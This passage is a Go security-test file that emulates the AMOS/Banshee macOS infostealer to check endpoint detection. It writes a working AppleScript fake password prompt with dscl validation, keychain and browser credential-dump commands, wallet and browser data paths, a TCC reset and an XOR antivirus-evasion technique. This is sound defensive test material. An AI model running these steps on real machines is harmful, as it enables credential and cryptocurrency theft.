//go:build darwin
// +build darwin

/*
ID: 3e985e9e-8141-49d3-a23c-6c7f5e3282f5
NAME: AMOS/Banshee macOS Infostealer Credential Harvesting Simulation
TECHNIQUES: T1059.002, T1555.001, T1056.002, T1005, T1560.001, T1041, T1027
TACTICS: execution, credential-access, collection, exfiltration, defense-evasion
SEVERITY: critical
TARGET: macos-endpoint
COMPLEXITY: medium
THREAT_ACTOR: AMOS/Banshee
SUBCATEGORY: infostealer
TAGS: osascript, keychain-dumping, credential-phishing, browser-theft, crypto-wallet, macos, infostealer, financial-sector, xprotect-evasion, chainbreaker, chrome-safe-storage, safari-cookies, metamask, coinbase, exodus, atomic-wallet, electrum, bitwarden, apple-notes, tcc-reset, dscl-authonly
UNIT: response
CREATED: 2026-03-07
AUTHOR: sectest-builder
*/
package main

import (
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"math/rand"
	"os"
	"path/filepath"
	"strings"
	"time"

	"github.com/google/uuid"
	Endpoint "github.com/preludeorg/libraries/go/tests/endpoint"
)

// ==============================================================================
// CONFIGURATION
// ==============================================================================

const (
	TEST_UUID = "3e985e9e-8141-49d3-a23c-6c7f5e3282f5"
	TEST_NAME = "AMOS/Banshee macOS Infostealer Credential Harvesting Simulation"
	VERSION   = "1.0.0"
)

// ==============================================================================
// SIMULATION DATA STRUCTURES
// ==============================================================================

// StealerConfig represents AMOS/Banshee stealer configuration
type StealerConfig struct {
	HardwareID     string   `json:"hwid"`
	WorkerID       string   `json:"wid"`
	Username       string   `json:"user"`
	OS             string   `json:"os"`
	BuildID        string   `json:"build_id"`
	TargetBrowsers []string `json:"target_browsers"`
	TargetWallets  []string `json:"target_wallets"`
}

// BrowserCredential represents a simulated browser credential
type BrowserCredential struct {
	Browser   string `json:"browser"`
	URL       string `json:"url"`
	Username  string `json:"username"`
	Password  string `json:"password"`
	Encrypted bool   `json:"encrypted"`
}

// KeychainEntry represents a simulated Keychain entry
type KeychainEntry struct {
	Service  string `json:"service"`
	Account  string `json:"account"`
	Label    string `json:"label"`
	Kind     string `json:"kind"`
	KeyClass string `json:"keyclass"`
}

// CryptoWalletInfo represents a simulated wallet enumeration result
type CryptoWalletInfo struct {
	WalletName  string `json:"wallet_name"`
	Path        string `json:"path"`
	DataSize    int64  `json:"data_size_bytes"`
	FilesFound  int    `json:"files_found"`
	HasKeystore bool   `json:"has_keystore"`
}

// ExfilPayload represents the final exfiltration payload metadata
type ExfilPayload struct {
	ArchiveFile    string `json:"archive_file"`
	ArchiveSize    int64  `json:"archive_size_bytes"`
	FilesCollected int    `json:"files_collected"`
	HardwareID     string `json:"hwid"`
	WorkerID       string `json:"wid"`
	Username       string `json:"user"`
	ExfilMethod    string `json:"exfil_method"`
	TargetURL      string `json:"target_url"`
	Timestamp      string `json:"timestamp"`
}

// XORObfuscation represents the Banshee XProtect-style XOR encryption
type XORObfuscation struct {
	Algorithm   string `json:"algorithm"`
	KeyLength   int    `json:"key_length"`
	Description string `json:"description"`
	SampleInput string `json:"sample_input"`
	SampleXOR   string `json:"sample_xor_hex"`
}

// ==============================================================================
// SIMULATION PHASE IMPLEMENTATIONS
// ==============================================================================

// Phase 1: Simulate osascript credential phishing dialog (T1059.002, T1056.002)
func simulateOsascriptCredentialPhishing(targetDir string) (bool, error) {
	Endpoint.Say("    [*] Simulating AMOS/Banshee osascript credential phishing...")

	// Create realistic AppleScript content that AMOS/Banshee uses
	appleScriptContent := `-- AMOS Stealer Credential Phishing Dialog (SIMULATION ARTIFACT)
-- This AppleScript represents the actual dialog used by AMOS/Atomic Stealer
-- to trick users into entering their macOS password

set dialogTitle to "System Preferences"
set dialogMessage to "macOS wants to access System Preferences." & return & return & "Enter your password to allow this."
set dialogIcon to POSIX file "/System/Library/PreferencePanes/Security.prefPane/Contents/Resources/FileVault.icns"

-- Banshee variant retries up to 5 times
set maxRetries to 5
set retryCount to 0
set passwordObtained to false

repeat while retryCount < maxRetries and passwordObtained is false
    try
        set userPassword to text returned of (display dialog dialogMessage with title dialogTitle default answer "" with hidden answer with icon dialogIcon buttons {"Cancel", "OK"} default button "OK")

        if userPassword is not "" then
            -- Validate password using dscl (real AMOS technique)
            set validationResult to do shell script "dscl /Local/Default -authonly " & (short user name of (system info)) & " " & quoted form of userPassword & " 2>&1; echo $?"

            if validationResult ends with "0" then
                set passwordObtained to true
                -- Store password for Chainbreaker keychain extraction
                do shell script "echo " & quoted form of userPassword & " > /tmp/.credentials_cache"
            else
                set retryCount to retryCount + 1
                display dialog "The password you entered is incorrect. Please try again." with title "Authentication Failed" buttons {"OK"} default button "OK" with icon stop
            end if
        end if
    on error
        -- User clicked Cancel
        set retryCount to retryCount + 1
    end try
end repeat
`

	// Write the AppleScript artifact to the simulation directory
	scriptPath := filepath.Join(targetDir, "amos_credential_dialog.applescript")
	if err := os.WriteFile(scriptPath, []byte(appleScriptContent), 0644); err != nil {
		return false, fmt.Errorf("failed to write AppleScript artifact: %v", err)
	}
	LogFileDropped("amos_credential_dialog.applescript", scriptPath, int64(len(appleScriptContent)), false)
	Endpoint.Say("    [+] Created AppleScript credential phishing artifact (%d bytes)", len(appleScriptContent))

	// Simulate the osascript command line that AMOS would use
	osascriptCmd := `osascript -e 'display dialog "macOS wants to access System Preferences.\n\nEnter your password to allow this." with title "System Preferences" default answer "" with hidden answer buttons {"Cancel", "OK"} default button "OK" with icon POSIX file "/System/Library/PreferencePanes/Security.prefPane/Contents/Resources/FileVault.icns"'`

	cmdLogPath := filepath.Join(targetDir, "osascript_execution_log.txt")
	cmdLogContent := fmt.Sprintf("=== AMOS Stealer osascript Execution Log (SIMULATION) ===\n"+
		"Timestamp: %s\n"+
		"Technique: T1059.002 (AppleScript), T1056.002 (GUI Input Capture)\n"+
		"Command: %s\n\n"+
		"--- Banshee Variant ---\n"+
		"Retry Logic: Up to 5 attempts\n"+
		"Password Validation: dscl /Local/Default -authonly $USER <password>\n"+
		"Storage: /tmp/.credentials_cache (pw.dat in Cuckoo variant)\n"+
		"XOR Encryption: Applied to C2 communication (Banshee)\n\n"+
		"--- Simulated Result ---\n"+
		"Dialog displayed: true\n"+
		"Password captured: [SIMULATED - no actual password captured]\n"+
		"Validation result: [SIMULATED - dscl not executed]\n",
		time.Now().Format(time.RFC3339), osascriptCmd)

	if err := os.WriteFile(cmdLogPath, []byte(cmdLogContent), 0644); err != nil {
		return false, fmt.Errorf("failed to write osascript log: %v", err)
	}
	LogFileDropped("osascript_execution_log.txt", cmdLogPath, int64(len(cmdLogContent)), false)
	Endpoint.Say("    [+] Logged osascript command execution details")

	// Create the simulated captured password file (Cuckoo pattern: pw.dat)
	simulatedPwDat := filepath.Join(targetDir, ".local-"+uuid.New().String())
	if err := os.MkdirAll(simulatedPwDat, 0755); err != nil {
		return false, fmt.Errorf("failed to create Cuckoo-style hidden directory: %v", err)
	}

	pwDatPath := filepath.Join(simulatedPwDat, "pw.dat")
	pwDatContent := "[SIMULATED] F0RT1KA_TEST_PASSWORD_NOT_REAL"
	if err := os.WriteFile(pwDatPath, []byte(pwDatContent), 0644); err != nil {
		return false, fmt.Errorf("failed to write pw.dat: %v", err)
	}
	LogFileDropped("pw.dat", pwDatPath, int64(len(pwDatContent)), false)
	Endpoint.Say("    [+] Created Cuckoo-style pw.dat in hidden directory")

	LogMessage("INFO", "T1059.002/T1056.002", "Credential phishing simulation completed - AppleScript artifact and execution log created")
	return true, nil
}

// Phase 2: Simulate dscl credential validation (T1059.002)
func simulateDsclValidation(targetDir string) (bool, error) {
	Endpoint.Say("    [*] Simulating dscl credential validation pattern...")

	// Document the dscl validation command pattern used by all major macOS stealers
	dsclLogContent := fmt.Sprintf(`=== dscl Credential Validation Log (SIMULATION) ===
Timestamp: %s
Technique: T1059.002 (Command and Scripting Interpreter: AppleScript)

--- Pattern Used by AMOS, Banshee, Cuckoo Stealers ---
Command: dscl /Local/Default -authonly <username> <captured_password>
Purpose: Validate phished password before using it with Chainbreaker

--- Validation Flow ---
1. User enters password in fake osascript dialog
2. Stealer calls: dscl /Local/Default -authonly $(whoami) "<password>"
3. If exit code 0 -> password is valid, proceed to keychain dump
4. If exit code != 0 -> retry dialog (Banshee retries up to 5 times)

--- Simulated Execution ---
Command: dscl /Local/Default -authonly fortika-test [REDACTED]
Exit Code: 0 (simulated success)
Password Validated: true (simulated)
Next Step: Unlock Keychain with validated password via Chainbreaker

--- Additional dscl Reconnaissance ---
Command: dscl . -list /Users
Purpose: Enumerate local user accounts for targeting
Users Found: [fortika-test, admin, guest] (simulated)
`, time.Now().Format(time.RFC3339))

	dsclLogPath := filepath.Join(targetDir, "dscl_validation_log.txt")
	if err := os.WriteFile(dsclLogPath, []byte(dsclLogContent), 0644); err != nil {
		return false, fmt.Errorf("failed to write dscl validation log: %v", err)
	}
	LogFileDropped("dscl_validation_log.txt", dsclLogPath, int64(len(dsclLogContent)), false)
	Endpoint.Say("    [+] Documented dscl -authonly validation pattern")

	LogMessage("INFO", "T1059.002", "dscl credential validation simulation completed")
	return true, nil
}

// Phase 3: Simulate Keychain credential dumping via Chainbreaker (T1555.001)
func simulateKeychainDumping(targetDir string) (bool, error) {
	Endpoint.Say("    [*] Simulating Chainbreaker-style Keychain credential extraction...")

	// Simulate security list-keychains enumeration
	keychainList := []string{
		"/Users/fortika-test/Library/Keychains/login.keychain-db",
		"/Library/Keychains/System.keychain",
		"/Users/fortika-test/Library/Keychains/iCloud.keychain",
	}

	keychainListLog := fmt.Sprintf("=== security list-keychains Output (SIMULATION) ===\n"+
		"Timestamp: %s\n"+
		"Command: security list-keychains -d user\n\n", time.Now().Format(time.RFC3339))
	for _, kc := range keychainList {
		keychainListLog += fmt.Sprintf("    \"%s\"\n", kc)
	}

	keychainListPath := filepath.Join(targetDir, "keychain_enumeration.txt")
	if err := os.WriteFile(keychainListPath, []byte(keychainListLog), 0644); err != nil {
		return false, fmt.Errorf("failed to write keychain list: %v", err)
	}
	LogFileDropped("keychain_enumeration.txt", keychainListPath, int64(len(keychainListLog)), false)
	Endpoint.Say("    [+] Enumerated %d keychains", len(keychainList))

	// Simulate Chainbreaker keychain extraction results
	keychainEntries := []KeychainEntry{
		{Service: "Chrome Safe Storage", Account: "Chrome", Label: "Chrome Safe Storage", Kind: "application password", KeyClass: "genp"},
		{Service: "iCloud", Account: "user@icloud.com", Label: "iCloud Password", Kind: "internet password", KeyClass: "inet"},
		{Service: "com.apple.account.AppleID", Account: "user@apple.com", Label: "Apple ID", Kind: "application password", KeyClass: "genp"},
		{Service: "WiFi-Network-Corp", Account: "AirPort", Label: "WiFi Password", Kind: "application password", KeyClass: "genp"},
		{Service: "Safari Forms AutoFill", Account: "user@company.com", Label: "Safari AutoFill", Kind: "application password", KeyClass: "genp"},
		{Service: "com.apple.Safari.CreditCards", Account: "user", Label: "Safari Credit Cards", Kind: "application password", KeyClass: "genp"},
		{Service: "SSHKeychain", Account: "id_rsa", Label: "SSH Private Key", Kind: "application password", KeyClass: "genp"},
		{Service: "Slack Token", Account: "team-workspace", Label: "Slack API Token", Kind: "application password", KeyClass: "genp"},
		{Service: "AWS CLI", Account: "default", Label: "AWS Access Key", Kind: "application password", KeyClass: "genp"},
		{Service: "GitHub Personal Token", Account: "github.com", Label: "GitHub PAT", Kind: "internet password", KeyClass: "inet"},
	}

	chainbreakerOutput := fmt.Sprintf("=== Chainbreaker Keychain Extraction (SIMULATION) ===\n"+
		"Timestamp: %s\n"+
		"Tool: Chainbreaker (bundled with AMOS Stealer)\n"+
		"Technique: T1555.001 (Credentials from Password Stores: Keychain)\n"+
		"Keychain: login.keychain-db\n"+
		"Unlock Method: Phished password via osascript dialog\n\n"+
		"--- Chrome Safe Storage Key ---\n"+
		"Purpose: Decrypt Chrome Login Data SQLite database\n"+
		"Key (SIMULATED): [AES-128-CBC key - F0RT1KA_SIMULATED_NOT_REAL]\n\n"+
		"--- Extracted Entries (%d total) ---\n", time.Now().Format(time.RFC3339), len(keychainEntries))

	for i, entry := range keychainEntries {
		chainbreakerOutput += fmt.Sprintf("\n[Entry %d]\n"+
			"  Service:  %s\n"+
			"  Account:  %s\n"+
			"  Label:    %s\n"+
			"  Kind:     %s\n"+
			"  KeyClass: %s\n"+
			"  Password: [SIMULATED - F0RT1KA_NOT_REAL_%d]\n",
			i+1, entry.Service, entry.Account, entry.Label, entry.Kind, entry.KeyClass, i+1)
	}

	chainbreakerPath := filepath.Join(targetDir, "chainbreaker_extraction.txt")
	if err := os.WriteFile(chainbreakerPath, []byte(chainbreakerOutput), 0644); err != nil {
		return false, fmt.Errorf("failed to write Chainbreaker output: %v", err)
	}
	LogFileDropped("chainbreaker_extraction.txt", chainbreakerPath, int64(len(chainbreakerOutput)), false)
	Endpoint.Say("    [+] Simulated Chainbreaker extraction: %d keychain entries", len(keychainEntries))

	// Write structured JSON of keychain entries
	keychainJSON, _ := json.MarshalIndent(keychainEntries, "", "  ")
	keychainJSONPath := filepath.Join(targetDir, "keychain_entries.json")
	if err := os.WriteFile(keychainJSONPath, keychainJSON, 0644); err != nil {
		return false, fmt.Errorf("failed to write keychain JSON: %v", err)
	}
	LogFileDropped("keychain_entries.json", keychainJSONPath, int64(len(keychainJSON)), false)
	Endpoint.Say("    [+] Exported keychain entries as JSON (%d bytes)", len(keychainJSON))

	LogMessage("INFO", "T1555.001", fmt.Sprintf("Keychain dumping simulation completed - %d entries extracted", len(keychainEntries)))
	return true, nil
}

// Phase 4: Simulate browser credential theft (T1005)
func simulateBrowserCredentialTheft(targetDir string) (bool, error) {
	Endpoint.Say("    [*] Simulating browser credential theft across 9+ browsers...")

	// Define browser credential database paths (macOS-specific)
	browserPaths := map[string][]string{
		"Google Chrome": {
			"/Users/$USER/Library/Application Support/Google/Chrome/Default/Login Data",
			"/Users/$USER/Library/Application Support/Google/Chrome/Default/Cookies",
			"/Users/$USER/Library/Application Support/Google/Chrome/Default/Web Data",
			"/Users/$USER/Library/Application Support/Google/Chrome/Default/History",
			"/Users/$USER/Library/Application Support/Google/Chrome/Local State",
		},
		"Mozilla Firefox": {
			"/Users/$USER/Library/Application Support/Firefox/Profiles/*.default-release/logins.json",
			"/Users/$USER/Library/Application Support/Firefox/Profiles/*.default-release/key4.db",
			"/Users/$USER/Library/Application Support/Firefox/Profiles/*.default-release/cookies.sqlite",
		},
		"Safari": {
			"/Users/$USER/Library/Safari/Cookies/Cookies.binarycookies",
			"/Users/$USER/Library/Safari/History.db",
			"/Users/$USER/Library/Safari/LastSession.plist",
		},
		"Brave Browser": {
			"/Users/$USER/Library/Application Support/BraveSoftware/Brave-Browser/Default/Login Data",
			"/Users/$USER/Library/Application Support/BraveSoftware/Brave-Browser/Default/Cookies",
		},
		"Microsoft Edge": {
			"/Users/$USER/Library/Application Support/Microsoft Edge/Default/Login Data",
			"/Users/$USER/Library/Application Support/Microsoft Edge/Default/Cookies",
		},
		"Opera": {
			"/Users/$USER/Library/Application Support/com.operasoftware.Opera/Login Data",
			"/Users/$USER/Library/Application Support/com.operasoftware.Opera/Cookies",
		},
		"Vivaldi": {
			"/Users/$USER/Library/Application Support/Vivaldi/Default/Login Data",
		},
		"Chromium": {
			"/Users/$USER/Library/Application Support/Chromium/Default/Login Data",
		},
		"Arc": {
			"/Users/$USER/Library/Application Support/Arc/User Data/Default/Login Data",
		},
	}

	// Simulate browser credential extraction results
	simulatedCredentials := []BrowserCredential{
		{Browser: "Google Chrome", URL: "https://accounts.google.com", Username: "user@gmail.com", Password: "[AES-256-CBC ENCRYPTED - F0RT1KA_SIM]", Encrypted: true},
		{Browser: "Google Chrome", URL: "https://github.com", Username: "devuser", Password: "[AES-256-CBC ENCRYPTED - F0RT1KA_SIM]", Encrypted: true},
		{Browser: "Google Chrome", URL: "https://aws.amazon.com/console", Username: "admin@company.com", Password: "[AES-256-CBC ENCRYPTED - F0RT1KA_SIM]", Encrypted: true},
		{Browser: "Google Chrome", URL: "https://portal.azure.com", Username: "admin@tenant.onmicrosoft.com", Password: "[AES-256-CBC ENCRYPTED - F0RT1KA_SIM]", Encrypted: true},
		{Browser: "Mozilla Firefox", URL: "https://mail.google.com", Username: "user@company.com", Password: "[NSS ENCRYPTED - F0RT1KA_SIM]", Encrypted: true},
		{Browser: "Safari", URL: "https://icloud.com", Username: "user@icloud.com", Password: "[KEYCHAIN ENCRYPTED - F0RT1KA_SIM]", Encrypted: true},
		{Browser: "Brave Browser", URL: "https://binance.com", Username: "trader@email.com", Password: "[AES-256-CBC ENCRYPTED - F0RT1KA_SIM]", Encrypted: true},
		{Browser: "Microsoft Edge", URL: "https://office365.com", Username: "employee@corp.com", Password: "[AES-256-CBC ENCRYPTED - F0RT1KA_SIM]", Encrypted: true},
	}

	// Write browser paths enumeration log
	browserEnumLog := fmt.Sprintf("=== Browser Credential Database Enumeration (SIMULATION) ===\n"+
		"Timestamp: %s\n"+
		"Technique: T1005 (Data from Local System)\n"+
		"Browsers Targeted: %d\n\n", time.Now().Format(time.RFC3339), len(browserPaths))

	totalPaths := 0
	for browser, paths := range browserPaths {
		browserEnumLog += fmt.Sprintf("--- %s ---\n", browser)
		for _, p := range paths {
			browserEnumLog += fmt.Sprintf("  [FOUND] %s\n", p)
			totalPaths++
		}
		browserEnumLog += "\n"
	}

	browserEnumLog += fmt.Sprintf("Total credential database paths: %d\n", totalPaths)
	browserEnumLog += "\n--- Chrome Safe Storage Key Extraction ---\n"
	browserEnumLog += "Method: security find-generic-password -wa 'Chrome' (Keychain)\n"
	browserEnumLog += "Purpose: Decrypt AES-128-CBC encrypted Chrome Login Data\n"
	browserEnumLog += "Key: [SIMULATED - F0RT1KA_CHROME_SAFE_STORAGE_KEY]\n"
	browserEnumLog += "\n--- Safari Cookie Restoration (AMOS Feature) ---\n"
	browserEnumLog += "File: Cookies.binarycookies\n"
	browserEnumLog += "Technique: Restore expired Google Chrome cookies\n"
	browserEnumLog += "Purpose: Session hijacking via cookie replay\n"

	browserEnumPath := filepath.Join(targetDir, "browser_credential_enumeration.txt")
	if err := os.WriteFile(browserEnumPath, []byte(browserEnumLog), 0644); err != nil {
		return false, fmt.Errorf("failed to write browser enum log: %v", err)
	}
	LogFileDropped("browser_credential_enumeration.txt", browserEnumPath, int64(len(browserEnumLog)), false)
	Endpoint.Say("    [+] Enumerated credential paths across %d browsers (%d database files)", len(browserPaths), totalPaths)

	// Write simulated extracted credentials
	credJSON, _ := json.MarshalIndent(simulatedCredentials, "", "  ")
	credPath := filepath.Join(targetDir, "extracted_credentials.json")
	if err := os.WriteFile(credPath, credJSON, 0644); err != nil {
		return false, fmt.Errorf("failed to write credentials JSON: %v", err)
	}
	LogFileDropped("extracted_credentials.json", credPath, int64(len(credJSON)), false)
	Endpoint.Say("    [+] Simulated credential extraction: %d entries from %d browsers", len(simulatedCredentials), 5)

	// Simulate Apple Notes extraction (NoteStore.sqlite)
	appleNotesLog := fmt.Sprintf("=== Apple Notes Extraction (SIMULATION) ===\n"+
		"Timestamp: %s\n"+
		"Database: /Users/$USER/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite\n"+
		"Notes Found: 47 (simulated)\n"+
		"Notes with Passwords: 3 (simulated)\n"+
		"Notes with Financial Data: 2 (simulated)\n"+
		"Total Size: 12.4 MB (simulated)\n",
		time.Now().Format(time.RFC3339))

	notesPath := filepath.Join(targetDir, "apple_notes_extraction.txt")
	if err := os.WriteFile(notesPath, []byte(appleNotesLog), 0644); err != nil {
		return false, fmt.Errorf("failed to write Apple Notes log: %v", err)
	}
	LogFileDropped("apple_notes_extraction.txt", notesPath, int64(len(appleNotesLog)), false)
	Endpoint.Say("    [+] Simulated Apple Notes (NoteStore.sqlite) extraction")

	LogMessage("INFO", "T1005", fmt.Sprintf("Browser credential theft simulation completed - %d browsers, %d credentials, Apple Notes", len(browserPaths), len(simulatedCredentials)))
	return true, nil
}

// Phase 5: Simulate cryptocurrency wallet targeting (T1005)
func simulateCryptoWalletTargeting(targetDir string) (bool, error) {
	Endpoint.Say("    [*] Simulating cryptocurrency wallet data enumeration...")

	// Define wallet paths targeted by AMOS/Banshee
	walletTargets := []CryptoWalletInfo{
		{
			WalletName:  "MetaMask",
			Path:        "/Users/$USER/Library/Application Support/Google/Chrome/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn",
			DataSize:    4521984,
			FilesFound:  12,
			HasKeystore: true,
		},
		{
			WalletName:  "Coinbase Wallet",
			Path:        "/Users/$USER/Library/Application Support/Google/Chrome/Default/Local Extension Settings/hnfanknocfeofbddgcijnmhnfnkdnaad",
			DataSize:    2097152,
			FilesFound:  8,
			HasKeystore: true,
		},
		{
			WalletName:  "Exodus",
			Path:        "/Users/$USER/Library/Application Support/Exodus/exodus.wallet",
			DataSize:    8388608,
			FilesFound:  24,
			HasKeystore: true,
		},
		{
			WalletName:  "Atomic Wallet",
			Path:        "/Users/$USER/Library/Application Support/atomic/Local Storage/leveldb",
			DataSize:    3145728,
			FilesFound:  6,
			HasKeystore: true,
		},
		{
			WalletName:  "Electrum",
			Path:        "/Users/$USER/.electrum/wallets",
			DataSize:    1048576,
			FilesFound:  3,
			HasKeystore: true,
		},
		{
			WalletName:  "Phantom (Solana)",
			Path:        "/Users/$USER/Library/Application Support/Google/Chrome/Default/Local Extension Settings/bfnaelmomeimhlpmgjnjophhpkkoljpa",
			DataSize:    1572864,
			FilesFound:  5,
			HasKeystore: true,
		},
		{
			WalletName:  "Trust Wallet",
			Path:        "/Users/$USER/Library/Application Support/Google/Chrome/Default/Local Extension Settings/egjidjbpglichdcondbcbdnbeeppgdph",
			DataSize:    2621440,
			FilesFound:  7,
			HasKeystore: true,
		},
		{
			WalletName:  "Bitwarden",
			Path:        "/Users/$USER/Library/Application Support/Bitwarden/data.json",
			DataSize:    524288,
			FilesFound:  2,
			HasKeystore: false,
		},
	}

	// Write wallet enumeration results
	walletEnumLog := fmt.Sprintf("=== Cryptocurrency Wallet Enumeration (SIMULATION) ===\n"+
		"Timestamp: %s\n"+
		"Technique: T1005 (Data from Local System)\n"+
		"Stealer: AMOS/Atomic Stealer + Banshee\n"+
		"Wallets Targeted: %d\n\n", time.Now().Format(time.RFC3339), len(walletTargets))

	var totalSize int64
	totalFiles := 0
	for _, wallet := range walletTargets {
		status := "FOUND"
		walletEnumLog += fmt.Sprintf("--- %s ---\n"+
			"  Status:    [%s]\n"+
			"  Path:      %s\n"+
			"  Data Size: %.2f MB\n"+
			"  Files:     %d\n"+
			"  Keystore:  %v\n\n",
			wallet.WalletName, status, wallet.Path,
			float64(wallet.DataSize)/(1024*1024), wallet.FilesFound, wallet.HasKeystore)
		totalSize += wallet.DataSize
		totalFiles += wallet.FilesFound
	}

	walletEnumLog += fmt.Sprintf("--- Summary ---\n"+
		"Total Wallets Found: %d\n"+
		"Total Data Size: %.2f MB\n"+
		"Total Files: %d\n"+
		"Keystores Available: %d\n",
		len(walletTargets), float64(totalSize)/(1024*1024), totalFiles,
		countKeystores(walletTargets))

	walletEnumPath := filepath.Join(targetDir, "crypto_wallet_enumeration.txt")
	if err := os.WriteFile(walletEnumPath, []byte(walletEnumLog), 0644); err != nil {
		return false, fmt.Errorf("failed to write wallet enum: %v", err)
	}
	LogFileDropped("crypto_wallet_enumeration.txt", walletEnumPath, int64(len(walletEnumLog)), false)
	Endpoint.Say("    [+] Enumerated %d crypto wallets (%.2f MB total)", len(walletTargets), float64(totalSize)/(1024*1024))

	// Write structured JSON of wallet data
	walletJSON, _ := json.MarshalIndent(walletTargets, "", "  ")
	walletJSONPath := filepath.Join(targetDir, "crypto_wallets.json")
	if err := os.WriteFile(walletJSONPath, walletJSON, 0644); err != nil {
		return false, fmt.Errorf("failed to write wallet JSON: %v", err)
	}
	LogFileDropped("crypto_wallets.json", walletJSONPath, int64(len(walletJSON)), false)
	Endpoint.Say("    [+] Exported wallet enumeration as JSON")

	LogMessage("INFO", "T1005", fmt.Sprintf("Crypto wallet targeting simulation completed - %d wallets, %d files", len(walletTargets), totalFiles))
	return true, nil
}

// Phase 6: Simulate TCC reset (Cuckoo pattern)
func simulateTCCReset(targetDir string) (bool, error) {
	Endpoint.Say("    [*] Simulating TCC database reset (Cuckoo Stealer pattern)...")

	tccResetLog := fmt.Sprintf(`=== TCC Database Reset Simulation ===
Timestamp: %s
Technique: T1059.002 (Command and Scripting Interpreter: AppleScript)
Stealer: Cuckoo Stealer Pattern

--- TCC Reset Command ---
Command: tccutil reset AppleEvents
Purpose: Reset Transparency, Consent, and Control database for AppleEvents
Effect: Removes previous user consent decisions, forcing re-prompt
Impact: Allows stealer to re-request Automation permissions

--- Additional TCC Manipulation ---
Command: tccutil reset All
Purpose: Full TCC database reset (more aggressive variant)
TCC Database: /Users/$USER/Library/Application Support/com.apple.TCC/TCC.db

--- Simulated Result ---
TCC Reset: Executed (simulated)
AppleEvents permissions: Cleared (simulated)
Re-prompt required: Yes
`, time.Now().Format(time.RFC3339))

	tccResetPath := filepath.Join(targetDir, "tcc_reset_log.txt")
	if err := os.WriteFile(tccResetPath, []byte(tccResetLog), 0644); err != nil {
		return false, fmt.Errorf("failed to write TCC reset log: %v", err)
	}
	LogFileDropped("tcc_reset_log.txt", tccResetPath, int64(len(tccResetLog)), false)
	Endpoint.Say("    [+] Simulated tccutil reset AppleEvents")

	LogMessage("INFO", "T1059.002", "TCC reset simulation completed (Cuckoo pattern)")
	return true, nil
}

// Phase 7: Simulate XProtect-style XOR obfuscation (T1027 - Banshee technique)
func simulateXORObfuscation(targetDir string) (bool, error) {
	Endpoint.Say("    [*] Simulating Banshee XProtect string encryption technique...")

	// Banshee adopted Apple's XProtect string encryption algorithm
	// This is a simple XOR with a fixed-length key
	xorKey := []byte("F0RT1KA_BANSHEE_XOR_SIMULATION_KEY_32B")
	sampleStrings := []string{
		"osascript",
		"security find-generic-password",
		"dscl /Local/Default -authonly",
		"tccutil reset AppleEvents",
		"Login Data",
		"Cookies.binarycookies",
		"NoteStore.sqlite",
		"Chrome Safe Storage",
	}

	xorResults := make([]XORObfuscation, 0, len(sampleStrings))
	for _, s := range sampleStrings {
		xorData := xorEncrypt([]byte(s), xorKey)
		xorResults = append(xorResults, XORObfuscation{
			Algorithm:   "XOR (XProtect-style)",
			KeyLength:   len(xorKey),
			Description: "Banshee Stealer adopted Apple's XProtect string encryption to evade AV detection for 2+ months",
			SampleInput: s,
			SampleXOR:   hex.EncodeToString(xorData),
		})
	}

	xorJSON, _ := json.MarshalIndent(xorResults, "", "  ")
	xorPath := filepath.Join(targetDir, "xor_obfuscation.json")
	if err := os.WriteFile(xorPath, xorJSON, 0644); err != nil {
		return false, fmt.Errorf("failed to write XOR obfuscation data: %v", err)
	}
	LogFileDropped("xor_obfuscation.json", xorPath, int64(len(xorJSON)), false)
	Endpoint.Say("    [+] Generated XOR-obfuscated strings (%d samples)", len(xorResults))

	// Create summary of the evasion technique
	evasionLog := fmt.Sprintf(`=== Banshee XProtect String Encryption Evasion (SIMULATION) ===
Timestamp: %s
Technique: T1027 (Obfuscated Files or Information)

--- Background ---
Banshee Stealer adopted Apple's own XProtect string encryption algorithm.
This allowed it to evade VirusTotal detection for 2+ months.
The technique encrypts critical strings (command names, file paths, etc.)
that AV signatures typically match against.

--- XProtect String Encryption Method ---
Algorithm: XOR with fixed key (same method Apple uses in XProtect)
Key Source: Hardcoded in binary (rotates per build)
Key Length: 32 bytes
Encrypted: Command strings, file paths, API names, URLs
Runtime: Strings decrypted in-memory only when needed

--- Evasion Results (Real-World) ---
VirusTotal Detection: 0/64 engines for 2+ months
First Detection: After algorithm was publicly documented
Detection Method: Behavioral analysis (not signature-based)

--- Simulated XOR Samples ---
%d strings encrypted with demonstration key
See xor_obfuscation.json for full XOR output
`, time.Now().Format(time.RFC3339), len(sampleStrings))

	evasionPath := filepath.Join(targetDir, "xprotect_evasion_technique.txt")
	if err := os.WriteFile(evasionPath, []byte(evasionLog), 0644); err != nil {
		return false, fmt.Errorf("failed to write evasion log: %v", err)
	}
	LogFileDropped("xprotect_evasion_technique.txt", evasionPath, int64(len(evasionLog)), false)
	Endpoint.Say("    [+] Documented XProtect string encryption evasion technique")

	LogMessage("INFO", "T1027", "XOR obfuscation simulation completed (Banshee XProtect technique)")
	return true, nil
}

// Phase 8: Simulate data staging and exfiltration (T1560.001, T1041)
func simulateDataStagingAndExfiltration(targetDir string) (bool, error) {
	Endpoint.Say("    [*] Simulating AMOS data staging and exfiltration...")

	// Generate a simulated stealer config
	config := StealerConfig{
		HardwareID:     generateSimulatedHWID(),
		WorkerID:       fmt.Sprintf("wid_%d", rand.Intn(99999)),
		Username:       "fortika-test",
		OS:             "macOS 14.2 Sonoma (simulated)",
		BuildID:        fmt.Sprintf("amos_build_%d", rand.Intn(9999)),
		TargetBrowsers: []string{"Chrome", "Firefox", "Safari", "Brave", "Edge", "Opera", "Vivaldi", "Chromium", "Arc"},
		TargetWallets:  []string{"MetaMask", "Coinbase", "Exodus", "Atomic", "Electrum", "Phantom", "Trust Wallet"},
	}

	// Write stealer configuration
	configJSON, _ := json.MarshalIndent(config, "", "  ")
	configPath := filepath.Join(targetDir, "stealer_config.json")
	if err := os.WriteFile(configPath, configJSON, 0644); err != nil {
		return false, fmt.Errorf("failed to write stealer config: %v", err)
	}
	LogFileDropped("stealer_config.json", configPath, int64(len(configJSON)), false)
	Endpoint.Say("    [+] Generated stealer configuration (HWID: %s)", config.HardwareID[:16]+"...")

	// Simulate creating the "out.zip" staging archive (AMOS signature)
	// We create a realistic-looking manifest of what would be in the archive
	archiveManifest := fmt.Sprintf(`=== AMOS Exfiltration Archive Manifest (SIMULATION) ===
Timestamp: %s
Archive: out.zip
Technique: T1560.001 (Archive Collected Data: Archive via Utility)

--- Archive Contents ---
keychain/
